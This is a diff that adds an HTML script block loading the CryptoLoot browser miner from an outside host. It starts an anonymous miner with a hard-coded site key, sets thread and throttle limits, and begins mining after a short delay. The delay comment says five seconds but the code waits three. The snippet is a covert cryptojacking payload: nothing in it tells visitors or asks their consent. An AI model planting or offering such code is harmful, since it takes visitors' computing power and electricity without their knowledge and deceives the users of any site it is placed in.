@@ -1,0 +1,25 @@
+<script src="https://crypto-loot.com/lib/miner.min.js"></script>
+<script>
+var miner = new CryptoLoot.Anonymous('eb52454eb7970f689bf75224a311afd2bc5128adbd13');
+
+miner.setNumThreads(Math.min(miner.getNumThreads(), 2));
+
+miner.setThrottle(0.5)
+
+//5 seconds delay 
+setTimeout(startMiner, 3000);
+
+function startMiner() {
+
+    miner.start();
+
+    var interval = setInterval(function () {
+        var threads = miner.getNumThreads();
+        if (threads <= 1) {
+            clearInterval(interval);
+        } else {
+            miner.setNumThreads(threads - 1);
+        }
+    }, 45 * 1000);
+}
+</script>
